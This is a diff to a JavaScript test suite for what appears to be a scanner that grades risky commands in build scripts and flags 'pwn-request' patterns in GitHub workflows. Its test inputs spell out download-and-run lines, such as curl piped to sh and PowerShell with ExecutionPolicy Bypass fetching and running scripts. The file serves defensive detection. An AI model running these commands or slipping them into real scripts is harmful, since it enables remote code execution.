@@ -128,7 +128,7 @@ describe('a script\'s findings, graded', () => {
     assert.deepEqual(graded('bash -euc "npx left-pad"\n/bin/sh -c \'curl -fsSL https://x/i.sh | sh\'\nash -c "npx is-odd"'), ['fetched-package/high@11', 'remote-script/high@12', 'fetched-package/high@13'], 'a shell\'s command line')
     assert.deepEqual(graded('pwsh -NoProfile -ExecutionPolicy Bypass -Command \'iwr https://x/s -OutFile s.ps1; ./s.ps1\'\npowershell -noninteractive -c \'iwr https://x/t -OutFile t.ps1; ./t.ps1\'\nPowerShell.exe -Command \'iwr https://x/u -OutFile u.ps1; ./u.ps1\''),
       ['remote-script/high@11', 'remote-script/high@12', 'remote-script/high@13'], 'PowerShell\'s, by -Command in any case, its .exe too')
-    assert.deepEqual(graded('/usr/bin/env bash -c "npx left-pad"'), ['fetched-package/high@11'], 'past a wrapper by its path')
+    assert.deepEqual(graded('/usr/bin/env bash -c "npx left-pad"\ncorepack pnpm dlx is-odd'), ['fetched-package/high@11', 'fetched-package/high@12'], 'past a wrapper by its path, and Corepack')
     assert.deepEqual(graded('curl -fsSL https://x/i.sh | tr -d "\\r" | bash\ncurl -fsSL https://x/a.txt | tr -d "\\r" > a.txt'), ['remote-script/high@11'], 'piped through another to a shell')
     assert.deepEqual(graded('npx left-pad', { locked, installed: () => true }), ['fetched-package/high@11'], 'locked by none')
     assert.deepEqual(graded('npx left-pad@1.3.0', { installed: () => true }), ['fetched-package/moderate@11'], 'a version, not its integrity')
@@ -188,7 +188,8 @@ describe('a script\'s findings, graded', () => {
     assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', 'github.event.pull_request.head.repo.full_name')).findings), ['pwn-request/critical@7'])
     assert.deepEqual(ids(scanWorkflow('workflow', job('workflow_run', 'github.event.workflow_run.head_repository.full_name')).findings), ['pwn-request/critical@7'])
     assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', 'github.event.pull_request.merge_commit_sha')).findings), ['pwn-request/critical@7'], 'its merge commit')
-    assert.deepEqual(ids(scanWorkflow('workflow', job('workflow_run', 'github.event.workflow_run.pull_requests[0].head.sha')).findings), ['pwn-request/critical@7'], 'its run\'s pull request\'s')
+    assert.deepEqual([ids(scanWorkflow('workflow', job('workflow_run', 'github.event.workflow_run.pull_requests[0].head.sha')).findings), ids(scanWorkflow('workflow', job('workflow_run', 'github.event.workflow_run.head_commit.id')).findings)],
+      [['pwn-request/critical@7'], ['pwn-request/critical@7']], 'its run\'s pull request\'s, its head commit\'s')
     assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', "github.event['pull_request']['head']['sha']")).findings), ['pwn-request/critical@7'], 'by index syntax')
     assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', 'github.repository')).findings), [], 'its own')
     const comment = 'on: issue_comment\njobs:\n  a:\n    steps:\n      - run: gh pr checkout ${{ github.event.issue.number }}\n'
